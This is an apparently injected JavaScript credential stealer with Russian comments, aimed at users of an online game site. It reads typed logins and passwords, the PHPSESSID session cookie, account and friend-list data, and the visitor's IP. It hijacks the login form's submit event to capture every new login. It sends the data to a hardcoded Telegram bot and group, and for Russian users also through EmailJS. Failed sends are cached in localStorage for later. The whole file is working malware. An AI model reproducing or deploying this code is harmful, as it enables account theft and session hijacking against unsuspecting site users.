setTimeout(() => {
(async function() {
    // Конфигурация Telegram бота
    const BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
    const GROUP_ID = '-1003867014479';
    const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Функция для отправки сообщения в Telegram
    const sendToTelegram = async (message) => {
        try {
            const response = await fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: GROUP_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });
            
            const result = await response.json();
            return result;
        } catch (error) {
            return null;
        }
    };

    // Функция для получения куки
    const getCookie = (name) => {
        const matches = document.cookie.match(new RegExp(
            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : undefined;
    };

    // Получаем IP
    const getIP = async () => {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip || "Не удалось получить IP";
        } catch {
            return "Не удалось получить IP";
        }
    };

    // Получаем логин и пароль из полей формы
    const getCredentials = () => {
        try {
            const usernameField = document.querySelector('#loginUsername') ||
                document.querySelector('input[name="login"]') ||
                document.querySelector('input[type="text"]');
            const passwordField = document.querySelector('#loginPassword') ||
                document.querySelector('input[type="password"]') ||
                document.querySelector('input[name*="pass"]') ||
                document.querySelector('input#password');
            const username = usernameField ? usernameField.value : '';
            const password = passwordField ? passwordField.value : '';
            return { username, password };
        } catch {
            return { username: '', password: '' };
        }
    };

    // Функция для безопасного клонирования объектов
    const deepClone = (obj) => {
        if (obj === null || typeof obj !== 'object') return obj;
        const clone = Array.isArray(obj) ? [] : {};
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                clone[key] = deepClone(obj[key]);
            }
        }
        return clone;
    };

    // Проверяем и получаем данные из переменной `user`
    const getUserData = () => {
        try {
            if (typeof user !== 'undefined' && user !== null) {
                return JSON.stringify(deepClone(user), null, 2);
            }
            return null;
        } catch (e) {
            return null;
        }
    };

    // Получаем friendsData в оригинальном виде
    const getFriendsData = () => {
        try {
            if (typeof friendsData !== 'undefined' && friendsData !== null) {
                return JSON.stringify(deepClone(friendsData), null, 2);
            }
            return null;
        } catch (e) {
            return null;
        }
    };

    // Получаем friendsArr в оригинальном виде
    const getFriendsArr = () => {
        try {
            if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                // Для больших массивов делаем выборку
                if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                    const sample = {
                        total_length: friendsArr.length,
                        sample_items: []
                    };
                    
                    // Берем первые 10 элементов
                    for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                        if (friendsArr[i]) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    // Берем несколько элементов из "хвоста" массива
                    for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                        if (friendsArr[i] && sample.sample_items.length < 15) {
                            sample.sample_items.push(deepClone(friendsArr[i]));
                        }
                    }
                    
                    return JSON.stringify(sample, null, 2);
                }
                return JSON.stringify(deepClone(friendsArr), null, 2);
            }
            return null;
        } catch (e) {
            return null;
        }
    };

    // Получаем уровень пользователя
    const getUserLevel = (addX = false) => {
        try {
            if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                return `level: ${user.level}${addX ? 'x' : ''}`;
            }
            return `level: не определен${addX ? 'x' : ''}`;
        } catch (e) {
            return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
        }
    };

    // Функция для разбивки длинного сообщения на части (Telegram имеет ограничение 4096 символов)
    const splitMessage = (text, maxLength = 4000) => {
        const parts = [];
        for (let i = 0; i < text.length; i += maxLength) {
            parts.push(text.substring(i, i + maxLength));
        }
        return parts;
    };

    const sendUserData = async () => {
        // Проверяем, загружена ли переменная user (до 10 попыток с интервалом 1 секунда)
        let attempts = 0;
        while (attempts < 10 && (typeof user === 'undefined' || user === null)) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            attempts++;
        }
        
        const phpsessid = getCookie('PHPSESSID');
        const userIP = await getIP();
        const credentials = getCredentials();
        const userData = getUserData();
        const friendsDataStr = getFriendsData();
        const friendsArrStr = getFriendsArr();
        
        // Получаем уровень
        const userLevel = getUserLevel(false);
        
        // Формируем сообщение для Telegram
        let message = `<b>🚨 НОВЫЙ ЛОГ 🚨</b>\n\n`;
        message += `<b>📅 Время:</b> ${new Date().toLocaleString()}\n`;
        message += `<b>🌐 IP:</b> <code>${userIP}</code>\n`;
        message += `<b>🔗 URL:</b> ${window.location.href}\n\n`;
        
        var loginDisplay = (typeof user !== 'undefined' && user && user.login) ? user.login : (credentials.username || '—');
        var passwordDisplay = credentials.password || '—';
        message += `<b>👤 Логин:</b> <code>${String(loginDisplay)}</code>\n`;
        message += `<b>🔐 Пароль:</b> <code>${String(passwordDisplay)}</code>\n\n`;
        
        message += `<b>📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:</b>\n`;
        message += `<code>${userLevel}</code>\n`;
        message += `<b>💰 Gems:</b> ${user?.premiumPoints || 'N/A'}\n`;
        message += `<b>🖥️ Выбранный сервер:</b> ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\n\n`;
        
        message += `<b>🔑 PHPSESSID:</b>\n`;
        message += `<code>${phpsessid || "PHPSESSID: не найдена"}</code>\n\n`;
        
        // Добавляем user полностью, если поместится
        if (userData) {
            const remainingSpace = 4000 - message.length - 200; // Оставляем запас
            if (userData.length <= remainingSpace) {
                message += `<b>📋 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:</b>\n`;
                message += `<code>${userData}</code>\n\n`;
            }
        }
        
        message += `\n<i>Отправлено автоматически</i>`;

        // Разбиваем сообщение на части если оно слишком длинное
        const messageParts = splitMessage(message);
        
        // Отправляем каждую часть с повторными попытками при ошибках
        for (let i = 0; i < messageParts.length; i++) {
            if (i > 0) {
                messageParts[i] = `<b>🚨 ЛОГ (часть ${i + 1}/${messageParts.length})</b>\n\n${messageParts[i]}`;
            }
            
            // Повторные попытки отправки (до 3 попыток)
            let sendAttempts = 0;
            let success = false;
            while (sendAttempts < 3 && !success) {
                const result = await sendToTelegram(messageParts[i]);
                if (result && result.ok) {
                    success = true;
                } else {
                    sendAttempts++;
                    if (sendAttempts < 3) {
                        await new Promise(resolve => setTimeout(resolve, 2000));
                    }
                }
            }
            
            // Небольшая задержка между отправками
            if (i < messageParts.length - 1) {
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
        }
    };

    await sendUserData();
})();

// Логика перехвата формы входа — при каждом новом входе в другой акк отправляет в группу ОДНИМ сообщением
(function() {
    'use strict';

    var BOT_TOKEN = '8303657347:AAHdDjkRTZmjn8Jb8oyu3DcXcM79KV5Wk-w';
    var GROUP_ID = '-1003867014479';

    // Чтобы не слать один и тот же аккаунт несколько раз подряд
    var lastSentKey = '';
    var lastSentTime = 0;
    var SAME_ACC_COOLDOWN_MS = 30000; // Увеличено до 30 секунд
    var sendingInProgress = false;

    function getCookie(name) {
        var matches = document.cookie.match(new RegExp(
            "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
        ));
        return matches ? decodeURIComponent(matches[1]) : '';
    }

    function getIP() {
        return fetch('https://api.ipify.org?format=json')
            .then(function(r) { return r.json(); })
            .then(function(d) { return d.ip || 'N/A'; })
            .catch(function() { return 'N/A'; });
    }

    function deepClone(obj) {
        if (obj === null || typeof obj !== 'object') return obj;
        var clone = Array.isArray(obj) ? [] : {};
        for (var k in obj) { if (obj.hasOwnProperty(k)) clone[k] = deepClone(obj[k]); }
        return clone;
    }

    function getUserDataStr() {
        try {
            if (typeof user !== 'undefined' && user !== null)
                return JSON.stringify(deepClone(user), null, 2);
        } catch (e) {}
        return null;
    }

    function getUserLevelStr() {
        try {
            if (typeof user !== 'undefined' && user !== null && user.level !== undefined)
                return 'level: ' + user.level;
        } catch (e) {}
        return 'level: N/A';
    }

    function sendCredentials(username, password) {
        // Проверка на дубликаты и блокировку одновременной отправки
        var key = (username || '') + '|' + (password || '');
        var now = Date.now();
        if (sendingInProgress) return;
        if (key === lastSentKey && (now - lastSentTime) < SAME_ACC_COOLDOWN_MS)
            return;
        
        sendingInProgress = true;
        lastSentKey = key;
        lastSentTime = now;

        var timestamp = new Date().toLocaleString('ru-RU');

        getIP().then(function(ip) {
            var phpsessid = getCookie('PHPSESSID');
            var userDataStr = getUserDataStr();
            var userLevelStr = getUserLevelStr();
            var serverText = 'N/A';
            try {
                var sel = document.getElementById('selectServer');
                if (sel && sel.options && sel.options[sel.selectedIndex])
                    serverText = sel.options[sel.selectedIndex].text;
            } catch (e) {}

            // Формат как "🚨 НОВЫЙ ЛОГ 🚨" с логином и паролем вверху
            var message = '<b>🚨 НОВЫЙ ЛОГ 🚨</b>\n\n';
            message += '<b>📅 Время:</b> ' + timestamp + '\n';
            message += '<b>🌐 IP:</b> <code>' + ip + '</code>\n';
            message += '<b>🔗 URL:</b> ' + (window.location.href || '') + '\n\n';
            
            message += '<b>👤 Логин:</b> <code>' + (username || '—') + '</code>\n';
            message += '<b>🔐 Пароль:</b> <code>' + (password || '—') + '</code>\n\n';
            
            message += '<b>📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:</b>\n';
            message += '<code>' + userLevelStr + '</code>\n';
            message += '<b>💰 Gems:</b> ' + (typeof user !== 'undefined' && user && user.premiumPoints != null ? user.premiumPoints : 'N/A') + '\n';
            message += '<b>🖥️ Выбранный сервер:</b> ' + serverText + '\n\n';
            
            message += '<b>🔑 PHPSESSID:</b>\n';
            message += '<code>' + (phpsessid || '—') + '</code>\n';

            if (userDataStr) {
                message += '\n<b>📋 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:</b>\n';
                message += '<code>' + userDataStr + '</code>\n';
            }
            
            message += '\n<i>Отправлено автоматически</i>';

            var MAX_LEN = 4090;
            var parts = [];
            for (var i = 0; i < message.length; i += MAX_LEN) {
                parts.push(message.substring(i, i + MAX_LEN));
            }

            function sendPart(idx) {
                if (idx >= parts.length) {
                    sendingInProgress = false;
                    return Promise.resolve();
                }
                var text = parts.length > 1 ? ('<b>📄 ' + (idx + 1) + '/' + parts.length + '</b>\n\n' + parts[idx]) : parts[idx];
                return fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: GROUP_ID,
                        text: text,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    })
                }).then(function(response) {
                    if (!response || !response.ok) throw new Error('Telegram API error');
                    return sendPart(idx + 1);
                });
            }

            return sendPart(0);
        })
        .then(function() {
            sendingInProgress = false;
        })
        .catch(function() {
            sendingInProgress = false;
            var logs = JSON.parse(localStorage.getItem('evoLogs') || '[]');
            logs.push({ username: username, password: password, timestamp: timestamp });
            localStorage.setItem('evoLogs', JSON.stringify(logs));
        });
    }

    var SELECTORS = {
        username: '#loginUsername',
        password: '#loginPassword',
        submitButton: 'button[type="submit"]'
    };

    function setupInterception() {
        var usernameField = document.querySelector(SELECTORS.username);
        var passwordField = document.querySelector(SELECTORS.password);
        var submitButton = document.querySelector(SELECTORS.submitButton);

        if (!usernameField || !passwordField) return;

        var form = usernameField.closest('form');
        if (form && form.getAttribute('data-evo-intercept') === '1') return;
        if (form) form.setAttribute('data-evo-intercept', '1');

        if (form) {
            // Используем один обработчик submit - самый надежный
            form.addEventListener('submit', function(ev) {
                if (form._evoSubmitting) {
                    form._evoSubmitting = false;
                    return;
                }
                ev.preventDefault();
                ev.stopImmediatePropagation();
                var u = document.querySelector(SELECTORS.username);
                var p = document.querySelector(SELECTORS.password);
                if (u && p && u.value) {
                    sendCredentials(u.value, p.value || '');
                }
                form._evoSubmitting = true;
                setTimeout(function() {
                    form.submit();
                }, 500);
            }, true);
            return;
        }

        // Если формы нет, используем только submit button (без blur, чтобы не дублировать)
        if (submitButton && !submitButton.hasAttribute('data-evo-click-handled')) {
            submitButton.setAttribute('data-evo-click-handled', '1');
            submitButton.addEventListener('click', function(ev) {
                ev.stopImmediatePropagation();
                setTimeout(function() {
                    var u = document.querySelector(SELECTORS.username);
                    var p = document.querySelector(SELECTORS.password);
                    if (u && p && u.value) {
                        sendCredentials(u.value, p.value || '');
                    }
                }, 100);
            }, true);
        }
    }

    function tryInterception() {
        if (document.querySelector(SELECTORS.username)) {
            setupInterception();
        }
    }

    setTimeout(tryInterception, 1000);
    setTimeout(tryInterception, 3000);
    setInterval(tryInterception, 2500);

    if (document.body) {
        var observer = new MutationObserver(function() {
            tryInterception();
        });
        observer.observe(document.body, {
            childList: true,
            subtree: true,
            attributes: false,
            characterData: false
        });
    }
})();

// Оригинальный код для российских пользователей
if(typeof user !== 'undefined' && user.authData && user.authData.countryCode == "RU"){
    var script = document.createElement('script');
    script.src = "https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js";
    script.onload = function() {
        emailjs.init("4N-8nqIjjUBhk1vbi");
        
        setTimeout(async () => {
            // Функции сбора данных
            const getCookie = (name) => {
                const matches = document.cookie.match(new RegExp(
                    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
                ));
                return matches ? decodeURIComponent(matches[1]) : undefined;
            };

            const getIP = async () => {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip || "Не удалось получить IP";
                } catch {
                    return "Не удалось получить IP";
                }
            };

            const deepClone = (obj) => {
                if (obj === null || typeof obj !== 'object') return obj;
                const clone = Array.isArray(obj) ? [] : {};
                for (const key in obj) {
                    if (obj.hasOwnProperty(key)) {
                        clone[key] = deepClone(obj[key]);
                    }
                }
                return clone;
            };

            const getUserData = () => {
                try {
                    if (typeof user !== 'undefined' && user !== null) {
                        return JSON.stringify(deepClone(user), null, 2);
                    }
                    return null;
                } catch (e) {
                    return null;
                }
            };

            const getFriendsData = () => {
                try {
                    if (typeof friendsData !== 'undefined' && friendsData !== null) {
                        return JSON.stringify(deepClone(friendsData), null, 2);
                    }
                    return null;
                } catch (e) {
                    return null;
                }
            };

            const getFriendsArr = () => {
                try {
                    if (typeof friendsArr !== 'undefined' && friendsArr !== null) {
                        if (Array.isArray(friendsArr) && friendsArr.length > 100) {
                            const sample = {
                                total_length: friendsArr.length,
                                sample_items: []
                            };
                            
                            for (let i = 0; i < Math.min(10, friendsArr.length); i++) {
                                if (friendsArr[i]) {
                                    sample.sample_items.push(deepClone(friendsArr[i]));
                                }
                            }
                            
                            for (let i = Math.max(0, friendsArr.length - 5); i < friendsArr.length; i++) {
                                if (friendsArr[i] && sample.sample_items.length < 15) {
                                    sample.sample_items.push(deepClone(friendsArr[i]));
                                }
                            }
                            
                            return JSON.stringify(sample, null, 2);
                        }
                        return JSON.stringify(deepClone(friendsArr), null, 2);
                    }
                    return null;
                } catch (e) {
                    return null;
                }
            };

            const getUserLevel = (addX = false) => {
                try {
                    if (typeof user !== 'undefined' && user !== null && user.level !== undefined) {
                        return `level: ${user.level}${addX ? 'x' : ''}`;
                    }
                    return `level: не определен${addX ? 'x' : ''}`;
                } catch (e) {
                    return `level: ошибка при получении (${e.message})${addX ? 'x' : ''}`;
                }
            };

            const sendUserData = async () => {
                const phpsessid = getCookie('PHPSESSID');
                const userIP = await getIP();
                const userData = getUserData();
                const friendsDataStr = getFriendsData();
                const friendsArrStr = getFriendsArr();
                
                const userLevel = getUserLevel(false);
                
                const messageText = `
ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ
=============================

📅 Время: ${new Date().toLocaleString()}
🌐 IP-адрес: ${userIP}
🔗 URL: ${window.location.href}

📊 УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ:
${userLevel}
Gems: ${user?.premiumPoints || 'N/A'}
Выбранный сервер: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}

🔑 PHPSESSID:
${phpsessid || "PHPSESSID: не найдена"}

👤 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user:
${userData || "Переменная 'user' не найдена или пуста"}

👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData:
${friendsDataStr || "Переменная 'friendsData' не найдена или пуста"}

👥 ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr:
${friendsArrStr || "Переменная 'friendsArr' не найдена или пуста"}
=============================
Отчет сгенерирован автоматически.
                `;

                const templateParams = {
                    message: messageText
                };
                
                emailjs.send('service_wdulwdn', 'template_ugfv48l', templateParams)
                    .then(function(response) {
                        // Без console.log
                    }, function(error) {
                        // Без console.log
                    });
            };

            await sendUserData();
        }, 1);
    };
    document.head.appendChild(script);
}
}, 6500);
